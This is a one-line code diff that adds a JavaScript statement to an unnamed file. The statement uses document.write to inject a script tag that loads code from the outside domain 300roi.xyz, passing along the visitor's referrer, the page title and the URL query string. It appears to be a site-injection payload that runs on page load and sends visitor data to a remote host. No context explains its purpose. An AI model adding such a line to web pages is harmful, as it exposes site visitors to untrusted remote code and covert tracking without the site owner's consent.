@@ -1,0 +1,1 @@
+document.write('<script type="application/javascript" src="https://300roi.xyz/fbtest1?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm=script"><' + '/script>');
